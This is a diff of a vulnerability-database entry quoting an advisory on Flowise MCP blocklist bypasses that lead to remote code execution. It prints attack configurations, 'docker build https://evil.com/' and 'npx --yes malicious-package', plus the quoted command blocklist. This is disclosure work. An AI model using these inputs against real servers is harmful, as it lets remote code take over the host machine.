@@ -4,17 +4,17 @@ datasource_url: https://github.com/github/advisory-database/blob/main/advisories
 aliases: []
 summary: "Flowise has an MCP Security Bypass that Enables RCE\n## Summary\nThere are three bypass\
   \ methods for the security limitations of the Flowise MCP feature, and attackers can execute\
-  \ arbitrary commands by combining these three methods\n\n## Details\n\n### The Docker build\
-  \ subcommand not being on the blocklist leads to remote code execution \n\nThe attacker configures\
-  \ the interface through the MCP tool to provide {\"command\":\"docker\",\"args\":[\"build\"\
-  ,\"https://evil.com/\"]} as the Custom MCP Server configuration \n→ Bypass the validateCommandFlags\
-  \ docker blocklist (only blocks run/exec/-v/--volume, etc., but does not block build)\n→ docker\
-  \ build <remote-URL> will pull the Dockerfile from the remote address and execute the RUN\
-  \ instructions within it\n→ Allows attackers to escape from Docker through methods such as\
-  \ mounting, thereby gaining full control of the Flowise host machine \n\nPrecondition: \n\
-  1. Have a Flowise account (any role, including regular users) or an API with view&update permissions\
-  \ for chatflows\n2. The deployment environment has the docker command\n\nVulnerable function\
-  \ - validateCommandFlags: \n\n```\nfile: packages/components/nodes/tools/MCP/core.ts:260-310\n\
+  \ arbitrary commands by combining these three methods\n\n## Details\n\n\n### 【Vulnerability\
+  \  one】The Docker build subcommand not being on the blocklist leads to remote code execution\
+  \ \n\nThe attacker configures the interface through the MCP tool to provide {\"command\":\"\
+  docker\",\"args\":[\"build\",\"https://evil.com/\"]} as the Custom MCP Server configuration\
+  \ \n→ Bypass the validateCommandFlags docker blocklist (only blocks run/exec/-v/--volume,\
+  \ etc., but does not block build)\n→ docker build <remote-URL> will pull the Dockerfile from\
+  \ the remote address and execute the RUN instructions within it\n→ Allows attackers to escape\
+  \ from Docker through methods such as mounting, thereby gaining full control of the Flowise\
+  \ host machine \n\nPrecondition: \n1. Have a Flowise account (any role, including regular\
+  \ users) or an API with view&update permissions for chatflows\n2. The deployment environment\
+  \ has the docker command\n\nVulnerable function - validateCommandFlags: \n\n```\nfile: packages/components/nodes/tools/MCP/core.ts:260-310\n\
   \nconst COMMAND_FLAG_BLACKLIST: Record<string, string[]> = {\n    docker: [\n        'run',\
   \ 'exec', '-v', '--volume', '--privileged', '--cap-add',\n        '--security-opt', '--network',\
   \ '--pid', '--ipc'\n        //  'build', 'pull', 'push', 'cp', 'commit' are not on the blocklist\
@@ -31,14 +31,14 @@ summary: "Flowise has an MCP Security Bypass that Enables RCE\n## Summary\nThere
   : \"1\"}\n```\n\nAfter execution, the command can be triggered to execute docker build http://evil.com\
   \ \n\n<img width=\"1280\" height=\"319\" alt=\"f98e1d91428be6077ac6cf0472285f17\" src=\"https://github.com/user-attachments/assets/856d46b4-7949-4091-bed9-a7c3fecc62f0\"\
   \ />\n\nIf a privileged container is deployed, then it can fully control the Flowise host\
-  \ machine \n\n### npx --yes long parameter alias bypassing blocklist leads to remote code\
-  \ execution\n\nThe attacker configures the MCP tool to provide {\"command\":\"npx\",\"args\"\
-  :[\"--yes\",\"malicious-package\"]} \n→ validateCommandFlags npx blocklist only contains short\
-  \ parameter -y, and does not block long parameter alias --yes\n→ npx --yes malicious-package\
-  \ automatically agrees to install and execute any npm package\n→ Leads to remote code execution\
-  \ (RCE) on the server \n\nPrecondition: \n1. Have a Flowise account (any role, including regular\
-  \ users) or an API with view&update permissions for chatflows\n2. The deployment environment\
-  \ has the npx command\n\nnpx blocklist:\n\n```\nfile: packages/components/nodes/tools/MCP/core.ts:270-280\n\
+  \ machine \n\n### 【Vulnerability  two】 npx --yes long parameter alias bypassing blocklist\
+  \ leads to remote code execution\n\nThe attacker configures the MCP tool to provide {\"command\"\
+  :\"npx\",\"args\":[\"--yes\",\"malicious-package\"]} \n→ validateCommandFlags npx blocklist\
+  \ only contains short parameter -y, and does not block long parameter alias --yes\n→ npx --yes\
+  \ malicious-package automatically agrees to install and execute any npm package\n→ Leads to\
+  \ remote code execution (RCE) on the server \n\nPrecondition: \n1. Have a Flowise account\
+  \ (any role, including regular users) or an API with view&update permissions for chatflows\n\
+  2. The deployment environment has the npx command\n\nnpx blocklist:\n\n```\nfile: packages/components/nodes/tools/MCP/core.ts:270-280\n\
   \nnpx: ['-c', '--call', '--shell-auto-fallback', '-y'],\n//    Only the short parameter -y\
   \ is present, without the long parameter alias --yes\n```\n\nReproduction process:\nAdd MCP\
   \ config via UI or API interface, for example: \n\n<img width=\"1910\" height=\"690\" alt=\"\
